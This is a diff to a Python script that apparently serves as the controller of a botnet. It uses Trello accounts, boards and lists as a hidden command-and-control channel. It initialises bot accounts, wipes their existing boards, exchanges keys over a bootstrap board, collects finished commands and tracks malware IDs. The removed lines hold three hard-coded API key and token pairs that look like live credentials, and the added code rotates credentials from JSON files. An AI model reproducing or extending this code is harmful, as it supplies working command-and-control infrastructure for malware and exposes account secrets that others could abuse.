@@ -5,21 +5,9 @@ from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.asymmetric import dh
 from cryptography.hazmat.primitives.kdf.hkdf import HKDF
 
-
-available_bots_credentials = [
-    {
-        "key": '31b708e0742efe638e3b853603a4047a',
-        "token": 'ATTAbbf97f853af445a9fd020b9f0f0f50f165e6a2acd528a6356f3ef37cc5e99f9e69BF3540'
-    },
-    {
-        "key": '1a309a5b89a0715f0c40aaa138c871b4',
-        "token": '1fa51a67d1a601e39747812cd96634fd146e5554faa627ba9ca90fa9c137e021'
-    },
-    {
-        "key": '2a45bdaf483bf0e611dbf3e28acfad7a',
-        "token": '973e600d2fb08216cca81a86fdfbc9e8a06926307bd336d147b6ffd3655e4565'
-    }
-]
+NEW_CREDS_FILE = "new_creds.json"
+USED_CREDS_FILE = "used_creds.json"
+available_bots_credential = []
 used_bots_credentials = []
 
 malware_ids_used = []
@@ -39,7 +27,8 @@ def initialize_new_bot(bootstrap_list_id, bot_id):
     boards = utils.get_all_boards(new_key, new_token)
     for board in boards:
         if utils.delete_board(new_key, new_token, board['id']) < 0:
-            print("ERROR: could not delete board. key: " + new_key + ". id: " + board['id'])
+            print("ERROR: could not delete board. key: " +
+                  new_key + ". id: " + board['id'])
 
     # create new board and list on the new account
     if utils.create_board(new_key, new_token, utils.BOT_BOARD_NAME + bot_id) < 0:
@@ -49,7 +38,8 @@ def initialize_new_bot(bootstrap_list_id, bot_id):
     # post the new credentials on the bootstrap board
 
     # In each credentials exchange, the server generates a new private key and a new public key.
-    key = utils.exchange_keys(utils.BOOTSTRAP_KEY, utils.BOOTSTRAP_TOKEN, bootstrap_list_id, is_server=True)
+    key = utils.exchange_keys(
+        utils.BOOTSTRAP_KEY, utils.BOOTSTRAP_TOKEN, bootstrap_list_id, is_server=True)
     if key is None:
         print("ERROR: could not exchange keys")
         return
@@ -97,7 +87,7 @@ def check_bots_boards():
     for cred in used_bots_credentials:
         key = cred['key']
         token = cred['token']
-        
+
         # assume one board and list per bot
         boards = utils.get_all_boards(key, token)
         if len(boards) == 0:
@@ -118,9 +108,11 @@ def check_bots_boards():
             print(
                 "ERROR: bot is unknown or wasn't initialized properly. bot id: " + bot_id)
             continue
-        
-        todo_list_id = utils.get_list_id(key, token, utils.TODO_LIST_NAME, board_id)
-        done_list_id = utils.get_list_id(key, token, utils.DONE_LIST_NAME, board_id)
+
+        todo_list_id = utils.get_list_id(
+            key, token, utils.TODO_LIST_NAME, board_id)
+        done_list_id = utils.get_list_id(
+            key, token, utils.DONE_LIST_NAME, board_id)
         if not todo_list_id or not done_list_id:
             print("ERROR: could not find TODO or DONE list id for bot with key: " + key)
             continue
@@ -161,18 +153,30 @@ def check_bots_boards():
         finished_command_ids_per_bot[bot_id] = finished_commands
 
 
-def get_new_creds():
-    pass
+def update_creds():
+    # read available
+    global available_bots_credentials
+    global used_bots_credentials
+    available_bots_credentials = json.loads(open(NEW_CREDS_FILE).read())["creds"]
+    # update used
+    old_used_bots_credentials = json.loads(open(USED_CREDS_FILE).read())["creds"]
+    used_bots_credentials = utils.add_lists(used_bots_credentials, old_used_bots_credentials)
+    # print( used_bots_credentials)
+    json_object = json.dumps({"creds":used_bots_credentials}, indent = 4)
+    with open(USED_CREDS_FILE, "w") as outfile:
+        outfile.write(json_object)
+    # subtract used from available
+    available_bots_credentials = utils.subtract_lists(
+        available_bots_credentials, used_bots_credentials)
 
 
 def main():
     while True:
+        update_creds()
         check_bootstrap_board()
         check_bots_boards()
-        get_new_creds()
         time.sleep(10)
 
 
-# Press the green button in the gutter to run the script.
 if __name__ == '__main__':
     main()
